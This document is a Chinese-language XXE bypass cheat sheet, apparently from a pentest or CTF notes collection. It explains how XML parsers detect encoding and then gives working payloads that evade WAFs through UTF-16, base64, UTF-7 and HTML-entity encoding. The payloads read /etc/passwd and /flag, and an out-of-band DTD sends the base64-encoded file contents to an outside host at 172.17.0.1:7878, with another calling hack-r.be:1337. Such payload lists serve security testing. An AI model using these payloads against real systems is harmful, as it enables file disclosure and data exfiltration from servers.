# XXE Bypass

## 字符编码绕过
XML 解析器使用 4 种方法来检测编码：

+ HTTP 内容类型：Content-Type: text/xml; charset=utf-8
+ 读取字节顺序标记 (BOM)
+ 读取文档的第一个符号
  + UTF-8 (3C 3F 78 6D)
  + UTF-16BE (00 3C 00 3F)
  + UTF-16LE (3C 00 3F 00)
+ XML 声明：<?xml version="1.0" encoding="UTF-8"?>

| Encoding | BOM      | Example                             |              |
|----------|----------|-------------------------------------|--------------|
| UTF-8    | EF BB BF | EF BB BF 3C 3F 78 6D 6C             | ...<?xml     |
| UTF-16BE | FE FF    | FE FF 00 3C 00 3F 00 78 00 6D 00 6C | ...<.?.x.m.l |
| UTF-16LE | FF FE    | FF FE 3C 00 3F 00 78 00 6D 00 6C 00 | ..<.?.x.m.l. |

例如，我们可以将有效负载转换为UTF-16使用 [iconv](https://man7.org/linux/man-pages/man1/iconv.1.html) 来绕过某些 WAF：
```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

## Base64

```XML
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

## UTF7

[CyberChef](https://gchq.github.io/CyberChef/#recipe=Encode_text%28'UTF-7)

```XML
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```XML
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```

## HTML实体

[CyberChef](https://gchq.github.io/CyberChef/#recipe=To_HTML_Entity(true,'Numeric%20entities')&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)

```XML
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
    <env>&exfil;</env>
</data>
```

dtd:
```XML
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
